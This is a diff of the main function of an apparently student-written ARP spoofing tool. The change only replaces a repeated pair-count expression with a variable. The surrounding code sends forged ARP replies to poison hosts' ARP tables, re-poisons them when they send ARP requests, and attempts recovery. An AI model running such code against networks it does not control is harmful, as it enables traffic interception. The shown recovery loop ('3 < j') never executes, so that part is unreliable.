@@ -158,13 +158,14 @@ int main(int argc, char* argv[]) {
          std::string(myMac).c_str());
 
   map<Ip, Mac> macMap;
-  Ip senderIp[(argc - 3) / 2];
-  Ip targetIp[(argc - 3) / 2];
+  int numPair = (argc - 3) / 2;
+  Ip senderIp[numPair];
+  Ip targetIp[numPair];
 
   printf("\n");
 
   printf("=== get sender and target's addresses ===\n");
-  for (int i = 0; (argc - 3) / 2 > i; i++) {
+  for (int i = 0; numPair > i; i++) {
     senderIp[i] = Ip(argv[2 + i * 2]);
     targetIp[i] = Ip(argv[3 + i * 2]);
   }
@@ -177,7 +178,7 @@ int main(int argc, char* argv[]) {
 
   bool escapeFlag;
 
-  for (int i = 0; (argc - 3) / 2 > i; i++) {
+  for (int i = 0; numPair > i; i++) {
     if (macMap.end() == macMap.find(senderIp[i])) {
       escapeFlag = false;
 
@@ -296,7 +297,7 @@ int main(int argc, char* argv[]) {
     }
   }
 
-  for (int i = 0; (argc - 3) / 2 > i; i++) {
+  for (int i = 0; numPair > i; i++) {
     printf("sender#%d %s(%s)\n", i, std::string(senderIp[i]).c_str(),
            std::string(macMap.find(senderIp[i])->second).c_str());
     printf("target#%d %s(%s)\n", i, std::string(targetIp[i]).c_str(),
@@ -307,7 +308,7 @@ int main(int argc, char* argv[]) {
   printf("\n");
 
   printf("=== send arp packet to falsificate arp table ===\n");
-  for (int i = 0; (argc - 3) / 2 > i; i++) {
+  for (int i = 0; numPair > i; i++) {
     if (macMap.end() != macMap.find(senderIp[i])) {
       res = sendArpReply(handle, myMac, targetIp[i],
                          macMap.find(senderIp[i])->second, senderIp[i]);
@@ -348,7 +349,7 @@ int main(int argc, char* argv[]) {
     ArpHdr* arpHeader = (ArpHdr*)(packet + sizeof(EthHdr));
     uint16_t packetSize = 0x0000;
 
-    for (int i = 0; (argc - 3) / 2 > i; i++) {
+    for (int i = 0; numPair > i; i++) {
       if (ethernetHeader->type() == EthHdr::Arp &&
           arpHeader->op() == ArpHdr::Request &&
           ethernetHeader->smac() == macMap.find(senderIp[i])->second) {
@@ -398,7 +399,7 @@ int main(int argc, char* argv[]) {
   printf("\n");
 
   printf("=== recover arp table ===\n");
-  for (int i = 0; (argc - 3) / 2 > i; i++) {
+  for (int i = 0; numPair > i; i++) {
     if (macMap.end() != macMap.find(senderIp[i])) {
       for (int j = 0; 3 < j; j++) {
         res = sendArpRequest(handle, macMap.find(senderIp[i])->second,
